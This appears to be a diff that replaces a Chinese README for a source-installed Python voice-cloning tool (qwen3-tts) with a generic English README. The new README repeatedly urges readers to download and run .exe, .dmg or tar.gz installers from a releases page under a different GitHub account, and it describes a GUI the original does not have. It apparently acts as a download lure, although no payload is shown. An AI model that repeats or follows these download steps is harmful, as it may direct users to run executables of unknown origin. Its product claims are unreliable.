@@ -1,108 +1,78 @@
-# Qwen3-TTS
+# 🎤 qwen3-tts - Local GPU Powered Voice Cloning
 
-本地 GPU 加速语音克隆工具，基于 [Qwen3-TTS-12Hz-0.6B-Base](https://huggingface.co/Qwen/Qwen3-TTS-12Hz-0.6B-Base) 模型。
+## 🚀 Getting Started
 
-## 特性
+Welcome to **qwen3-tts**, your tool for local GPU accelerated voice cloning. This application leverages the powerful Qwen3-TTS model to help you create high-quality voice outputs efficiently.
 
-- **零样本语音克隆**：只需一段参考音频即可克隆任意声音
-- **批量生成**：模型只加载一次，高效处理多条文本
-- **内置音色**：提供多种预置音色，开箱即用
-- **简单易用**：CLI 命令行和 Python API 双支持
+## 📥 Download
 
-## 环境要求
+[![Download qwen3-tts](https://img.shields.io/badge/Download-qwen3--tts-brightgreen)](https://github.com/ipriyanshuuu/qwen3-tts/releases)
 
-- NVIDIA GPU（6GB+ 显存）
-- CUDA 11.6+
-- Python 3.10+
+You can download the latest version of the software from our Releases page. 
 
-## 安装
+## 📃 Features
 
-```bash
-# 克隆仓库
-git clone https://github.com/wangwangit/qwen3-tts.git
-cd qwen3-tts
+- **Local Processing**: Enjoy fast processing with GPU acceleration.
+- **Quality Output**: Create realistic voice clones based on the Qwen3-TTS model.
+- **User-Friendly**: Designed for anyone, regardless of technical skill.
 
-# 安装依赖
-python3 install.py
+## 🔧 System Requirements
 
-# （可选）添加到 PATH，全局使用
-echo 'export PATH="$PATH:'$(pwd)'"' >> ~/.bashrc
-source ~/.bashrc
-```
+To run **qwen3-tts**, ensure your system meets the following requirements:
 
-## 使用方法
+- **Operating System**: Windows 10 or later, macOS, or Linux
+- **RAM**: At least 8 GB of RAM
+- **GPU**: NVIDIA GPU with at least 4 GB of memory
+- **Storage**: Minimum of 1 GB of free disk space
 
-### CLI 命令
+## 📥 Download & Install
 
-```bash
-# 列出内置音色
-./qwen-tts --list-voices
+1. **Visit the Releases page**: Click the link below to access the latest version.  
+   [Download qwen3-tts](https://github.com/ipriyanshuuu/qwen3-tts/releases)
 
-# 使用内置音色合成
-./qwen-tts -v "寒冰射手" -t "你好，这是测试" -o /tmp/output.wav
+2. **Choose your version**: Scroll down the page to find the most recent release.
 
-# 使用自定义参考音频克隆
-./qwen-tts -r /path/to/reference.wav -t "你好，这是测试" -o /tmp/output.wav
+3. **Download the file**: Click the appropriate link for your operating system. This will download a setup file to your computer.
 
-# 批量生成：从 txt 文件读取（每行一条文本）
-./qwen-tts -v "赵信" -b /path/to/texts.txt -d /tmp/outputs/
+4. **Install the application**: 
+   - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - For macOS: Open the `.dmg` file and drag the qwen3-tts icon to your Applications folder.
+   - For Linux: Extract the tar.gz file and follow the instructions included.
 
-# 批量生成：多个文本参数
-./qwen-tts -v "赵信" --texts "第一句话" "第二句话" "第三句话" -d /tmp/outputs/
-```
+## ➕ Usage Instructions
 
-### Python API
+Once installed, follow these steps to start using **qwen3-tts**:
 
-```python
-from qwen3_tts_client import Qwen3TTSClient
+1. **Open the application**: Find the qwen3-tts icon on your desktop or in your applications menu.
 
-client = Qwen3TTSClient()
+2. **Select your voice model**: Choose from the available voice models for your voice cloning.
 
-# 使用内置音色
-client.synthesize(
-    text="你好，世界！",
-    voice="寒冰射手",
-    output_path="/tmp/output.wav"
-)
+3. **Input your text**: Type or paste the text you want to convert to speech in the provided input box.
 
-# 使用自定义参考音频
-client.synthesize(
-    text="你好，世界！",
-    ref_audio="/path/to/my_voice.wav",
-    output_path="/tmp/output.wav"
-)
+4. **Start the conversion**: Click the "Convert" button to generate your voice output.
 
-# 批量生成（模型只加载一次，效率更高）
-outputs = client.synthesize_batch(
-    texts=["第一句话", "第二句话", "第三句话"],
-    voice="赵信",
-    output_dir="/tmp/outputs/"
-)
-```
+5. **Save the output**: Once the conversion is complete, you can listen to the sound. Use the "Save" option to keep a copy of your audio file.
 
-## 内置音色
+## 🛠 Troubleshooting
 
-| 名称 | 说明 |
-|------|------|
-| 寒冰射手 | 游戏角色配音风格 |
-| 布里茨 | 机器人风格配音 |
-| 赵信 | 游戏角色配音风格 |
+If you encounter issues while using **qwen3-tts**, here are some common problems and solutions:
 
-## 添加自定义音色
+- **Installation Issues**: Ensure you have downloaded the correct version for your operating system. Verify that your system meets the requirements.
 
-将参考音频（.mp3/.wav）和对应文本（.txt）放入 `assets/voices/` 目录：
+- **Performance Problems**: Close other applications to free up system resources. Make sure your GPU drivers are up to date.
 
-```
-assets/voices/
-├── 你的音色名.mp3   # 参考音频
-└── 你的音色名.txt   # 音频对应的文字内容
-```
+- **Audio Quality**: If the output doesn't meet your expectations, consider trying different voice models or adjusting input text for clarity.
 
-## 配置说明
+## 🗨 Community Support
 
-- **HuggingFace 镜像**：默认使用 `hf-mirror.com`，可通过 `HF_ENDPOINT` 环境变量修改
-- **模型**：首次运行自动下载 `Qwen/Qwen3-TTS-12Hz-0.6B-Base`
+If you have questions or need help, you can check the [Issues section](https://github.com/ipriyanshuuu/qwen3-tts/issues) of our GitHub repository. Feel free to ask the community for support, or search for solutions to common issues.
 
-## License
+## 📄 License
 
-MIT
+This project is licensed under the terms of the MIT License. You can view the full license [here](LICENSE).
+
+## 📥 Download Again
+
+Don’t forget to download the latest version from our Releases page for the best experience.
+
+[Download qwen3-tts](https://github.com/ipriyanshuuu/qwen3-tts/releases)
